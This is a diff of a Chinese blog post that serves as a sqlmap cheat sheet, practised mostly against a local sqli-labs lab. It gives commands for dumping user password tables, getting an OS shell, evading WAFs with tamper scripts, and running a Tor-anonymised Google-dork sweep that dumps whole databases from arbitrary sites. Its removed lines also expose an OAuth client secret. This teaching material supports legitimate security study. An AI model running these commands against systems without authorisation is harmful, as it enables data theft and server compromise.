-                <div class="image-caption"></div>
-            </figure>
-<p><code>--level</code> 2 枚举强度<br><code>--cookie</code> “uname=admin” 可注入点<br>在<code>sqlilabs Less20</code>下实验</p>
-<h2 id="尝试是否存在注入"><a href="#尝试是否存在注入" class="headerlink" title="尝试是否存在注入"></a>尝试是否存在注入</h2><p><code>sqlmap &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --level 2</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./6.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --tables --level 2</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./7.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h1 id="SQLmap用于mysql注入"><a href="#SQLmap用于mysql注入" class="headerlink" title="SQLmap用于mysql注入"></a>SQLmap用于mysql注入</h1><p>(1)查找数据库<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --dbs</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./8.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<p>(2)通过第一步的数据库查找表<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --D security --tables</code><br>(3)通过表名查列名<br> <code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users --columns</code><br>(4) 通过列查字段<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users -C “id,user,password” --dump</code></p>
-<h1 id="sqlmap中post登陆框注入"><a href="#sqlmap中post登陆框注入" class="headerlink" title="sqlmap中post登陆框注入"></a>sqlmap中post登陆框注入</h1><p>(1) sqlmap -u “<a href="http://192.168.43.195/sqlilabs/Less-17&quot;" target="_blank" rel="noopener">http://192.168.43.195/sqlilabs/Less-17&quot;</a> –data “uname=1&amp;passwd=1”</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./9.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<h1 id="交互式-shell"><a href="#交互式-shell" class="headerlink" title="交互式 shell"></a>交互式 shell</h1><p>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-cmd “ipconfig”<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-shell<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-pwn<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –sql-shell<br><strong>条件绝对路径+注入点</strong></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./10.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前整理了些，在一些ＣＴＦ中发现随着编码、消毒、注入类型的改变有点不够用了。遂又熬了通宵整理了ｓｑｌｍａｐ使用和ｓｑｌ过waf技巧。后续持续更新</p>
+<h1 id="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><a href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）" class="headerlink" title="常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"></a>常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</h1><h2 id="判断能否注入"><a href="#判断能否注入" class="headerlink" title="判断能否注入"></a>判断能否注入</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot;</code><br><img src="./1.png" alt=""></p>
+<h2 id="猜解表"><a href="#猜解表" class="headerlink" title="猜解表"></a>猜解表</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables</code><br>》》指定数据库表名<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --tables -D security</code><br><img src="./2.png" alt=""></p>
+<h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --columns -T users</code><br><img src="./3.png" alt=""></p>
+<h2 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-1/?id=1&quot; --dump -T users -C &quot;username,password,id&quot;</code><br><img src="./4.png" alt=""></p>
+<h1 id="利用cookies"><a href="#利用cookies" class="headerlink" title="利用cookies"></a>利用cookies</h1><p><img src="./5.png" alt=""><br><code>--level</code> 2 枚举强度<br><code>--cookie</code> “uname=admin” 可注入点<br>在<code>sqlilabs Less20</code>下实验</p>
+<h2 id="尝试是否存在注入"><a href="#尝试是否存在注入" class="headerlink" title="尝试是否存在注入"></a>尝试是否存在注入</h2><p><code>sqlmap &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --level 2</code><br><img src="./6.png" alt=""></p>
+<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --cookie &quot;uname=admin*&quot; --tables --level 2</code><br><img src="./7.png" alt=""></p>
+<h1 id="SQLmap用于mysql注入"><a href="#SQLmap用于mysql注入" class="headerlink" title="SQLmap用于mysql注入"></a>SQLmap用于mysql注入</h1><p>(1)查找数据库<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --dbs</code><br><img src="./8.png" alt=""><br>(2)通过第一步的数据库查找表<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; --D security --tables</code><br>(3)通过表名查列名<br> <code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users --columns</code><br>(4) 通过列查字段<br><code>sqlmap -u &quot;http://192.168.43.195/sqlilabs/Less-20/index.php&quot; -D security -T users -C “id,user,password” --dump</code></p>
+<h1 id="sqlmap中post登陆框注入"><a href="#sqlmap中post登陆框注入" class="headerlink" title="sqlmap中post登陆框注入"></a>sqlmap中post登陆框注入</h1><p>(1) sqlmap -u “<a href="http://192.168.43.195/sqlilabs/Less-17&quot;" target="_blank" rel="noopener">http://192.168.43.195/sqlilabs/Less-17&quot;</a> –data “uname=1&amp;passwd=1”<br><img src="./9.png" alt=""></p>
+<h1 id="交互式-shell"><a href="#交互式-shell" class="headerlink" title="交互式 shell"></a>交互式 shell</h1><p>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-cmd “ipconfig”<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-shell<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-pwn<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –sql-shell<br><strong>条件绝对路径+注入点</strong><br><img src="./10.png" alt=""></p>
 <h1 id="伪静态网页注入"><a href="#伪静态网页注入" class="headerlink" title="伪静态网页注入"></a>伪静态网页注入</h1><p>显示为HTML网页，其实有和数据库交互<br>sqlmap -u “<a href="http://www.123.com/index/id/2*.com&quot;" target="_blank" rel="noopener">http://www.123.com/index/id/2*.com&quot;</a></p>
 <h1 id="sqlmap绕过WAF防火墙"><a href="#sqlmap绕过WAF防火墙" class="headerlink" title="sqlmap绕过WAF防火墙"></a>sqlmap绕过WAF防火墙</h1><p>sqlmap tamper下有绕过文件选项<br>–batch Never ask for user input, use the default behaviour<br>–tamper=TAMPER Use given script(s) for tampering injection data<br>常见 encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py<br>示例<br><code>./sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p>
 <h1 id="Tor代理与跳板"><a href="#Tor代理与跳板" class="headerlink" title="Tor代理与跳板"></a>Tor代理与跳板</h1><p><code>sudo service tor start</code><br>下面的命令将运行 SQLMap 用一些基本的设置使用 Tor 继续攻击者匿名, 也完全自动化的选择可能脆弱的网站, 使其在谷歌上搜索他们。<br>从一个终端攻击者将执行下列 (记住, 这只是向您显示攻击者是多<br>么容易, 您可能不希望运行此):<br><code>./sqlmap.py --tor --tor-type=SOCKS5 -g &quot;inurl:.php?id=1&quot; --random-agent --dump-all --batch
@@ -327,295 +207,137 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">【MySQL】</span><br><span class="line">版本  可用tamper编号  脚本名称</span><br><span class="line">4&#x2F;5.0&#x2F;5.5   1   0x2char</span><br><span class="line">6   between</span><br><span class="line">9   charencode</span><br><span class="line">16  concat2concatws</span><br><span class="line">18  greatest</span><br><span class="line">24  least</span><br><span class="line">25  lowercase</span><br><span class="line">35  randomcase</span><br><span class="line">39  space2comment</span><br><span class="line">49  space2randomblank</span><br><span class="line">53  uppercase</span><br><span class="line">5.1 7   bluecoat</span><br><span class="line">46  space2mysqlblank</span><br><span class="line">5.0&#x2F;5.5 12  commalesslimit</span><br><span class="line">13  commalessmid</span><br><span class="line">21  ifnull2casewhenisnull</span><br><span class="line">22  ifnull2ifisnull</span><br><span class="line">42  space2morecomment</span><br><span class="line">5.0 15  concat2concatws</span><br><span class="line">26  modsecurityversioned</span><br><span class="line">27  modsecurityzeroversioned</span><br><span class="line">4.0&#x2F;5.0 41  space2hash</span><br><span class="line">5.1.56  10  charunicodeencode</span><br><span class="line">5.1.56&#x2F;5.5.11   32  percentage</span><br><span class="line">56  versionedmorekeywords</span><br><span class="line">4.0.18&#x2F;5.0.22   19  halfversionedmorekeywords</span><br><span class="line">4.0.18&#x2F;5.1.56&#x2F;5.5.11    55  versionedkeywords</span><br><span class="line">5.1.41  43  space2morehash</span><br><span class="line">未指定版本   14  commentbeforeparentheses</span><br><span class="line">40  space2dash</span><br><span class="line">45  space2mssqlhash</span><br><span class="line">47  space2mysqldash</span><br></pre></td></tr></table></figure>
 <p>参考链接：<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最后更新时间：<time datetime="2020-05-15T08:31:22.000Z" itemprop="dateUpdated">2020-05-15 16:31:22</time>
-</span><br>
-
-
-        
-        玩的开心
-        
-    </div>
-    
-    <footer>
-        <a href="http://zhzhdoai.github.io">
-            <img src="/img/avatar.jpg" alt="osword">
-            osword
-        </a>
-    </footer>
-</blockquote>
-
-        
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlmap操作详解(常用备忘录)》 — osword's blog&url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/02/26/%E8%BD%AC%E8%BD%BD-WAF%E6%94%BB%E9%98%B2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%AF%87/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">转载 | WAF攻防之SQL注入篇</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">PHP之GET传参黑名单绕过</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<section class="comments" id="comments">
-    <div id="gitalk-container"></div>
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-    <script src="/js/md5.min.js"></script>
-    <script>
-        var gitalk = new Gitalk({
-            clientID: '7d7576c71632f14d639a',
-            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
-            repo: 'zhzhdoai.github.io',
-            owner: 'zhzhdoai',
-            admin: 'zhzhdoai',
-            id: md5(location.pathname),
-            perPage: 50,
-            distractionFreeMode: 'false'
-        })
-
-        gitalk.render('gitalk-container')
-    </script>
-</section>
-
-
-
+  </div>
 </article>
 
 
 
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常规盲注爆库爆表爆列爆字段（适用较多数据库类型）"><span class="toc-number">2.</span> <span class="toc-text">常规盲注爆库爆表爆列爆字段（适用较多数据库类型）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断能否注入"><span class="toc-number">2.1.</span> <span class="toc-text">判断能否注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解表"><span class="toc-number">2.2.</span> <span class="toc-text">猜解表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解列名"><span class="toc-number">2.3.</span> <span class="toc-text">猜解列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解字段"><span class="toc-number">2.4.</span> <span class="toc-text">猜解字段</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用cookies"><span class="toc-number">3.</span> <span class="toc-text">利用cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#尝试是否存在注入"><span class="toc-number">3.1.</span> <span class="toc-text">尝试是否存在注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆库"><span class="toc-number">3.2.</span> <span class="toc-text">爆库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLmap用于mysql注入"><span class="toc-number">4.</span> <span class="toc-text">SQLmap用于mysql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap中post登陆框注入"><span class="toc-number">5.</span> <span class="toc-text">sqlmap中post登陆框注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#交互式-shell"><span class="toc-number">6.</span> <span class="toc-text">交互式 shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#伪静态网页注入"><span class="toc-number">7.</span> <span class="toc-text">伪静态网页注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap绕过WAF防火墙"><span class="toc-number">8.</span> <span class="toc-text">sqlmap绕过WAF防火墙</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tor代理与跳板"><span class="toc-number">9.</span> <span class="toc-text">Tor代理与跳板</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用-Tor-网络当连接到目标网站攻击"><span class="toc-number">10.</span> <span class="toc-text">使用 Tor 网络当连接到目标网站攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#任意注射点"><span class="toc-number">11.</span> <span class="toc-text">任意注射点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#定制注射负载"><span class="toc-number">12.</span> <span class="toc-text">定制注射负载</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#水平选择"><span class="toc-number">13.</span> <span class="toc-text">水平选择</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#页面比较"><span class="toc-number">14.</span> <span class="toc-text">页面比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入技术选择"><span class="toc-number">15.</span> <span class="toc-text">sql注入技术选择</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#union查询中的sql注入条件修改"><span class="toc-number">16.</span> <span class="toc-text">union查询中的sql注入条件修改</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入文件xml学习"><span class="toc-number">17.</span> <span class="toc-text">注入文件xml学习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#列出数据库信息-包含列出库表列"><span class="toc-number">18.</span> <span class="toc-text">列出数据库信息(包含列出库表列)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#–current-user-：会话用户查询"><span class="toc-number">18.1.</span> <span class="toc-text">–current-user ：会话用户查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–current-db-当前数据库"><span class="toc-number">18.2.</span> <span class="toc-text">–current-db : 当前数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–hostname-服务器主机名"><span class="toc-number">18.3.</span> <span class="toc-text">–hostname : 服务器主机名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–is-dba-检测会话用户是否是数据库管理员"><span class="toc-number">18.4.</span> <span class="toc-text">–is-dba : 检测会话用户是否是数据库管理员</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–users-：-列出数据库管理系统用户"><span class="toc-number">18.5.</span> <span class="toc-text">–users ： 列出数据库管理系统用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–passwords-列出并列出数据库管理员用户的密码hash"><span class="toc-number">18.6.</span> <span class="toc-text">–passwords : 列出并列出数据库管理员用户的密码hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–privileges-：列出数据库管理系统用户权限"><span class="toc-number">18.7.</span> <span class="toc-text">–privileges ：列出数据库管理系统用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#–roles-：列出数据库管理系统用户角色"><span class="toc-number">18.8.</span> <span class="toc-text">–roles ：列出数据库管理系统用户角色</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#列出除系统数据库以外的表"><span class="toc-number">18.9.</span> <span class="toc-text">列出除系统数据库以外的表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#转存数据库表目"><span class="toc-number">19.</span> <span class="toc-text">转存数据库表目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#运行自定义SQL语句"><span class="toc-number">20.</span> <span class="toc-text">运行自定义SQL语句</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#新用户运行可执行命令"><span class="toc-number">21.</span> <span class="toc-text">新用户运行可执行命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#搜索数据库常用参数整理"><span class="toc-number">22.</span> <span class="toc-text">搜索数据库常用参数整理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–temper选择总结"><span class="toc-number">23.</span> <span class="toc-text">–temper选择总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&text=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&is_video=false&description=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqlmap操作详解(常用备忘录)&body=Check out this article: http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&name=sqlmap操作详解(常用备忘录)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&t=sqlmap操作详解(常用备忘录)" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
 </div>
 
-        <footer class="footer">
-    <div class="top">
         
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>osword &copy; 2015 - 2020</span>
-            <span>
-                
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
-    </div>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
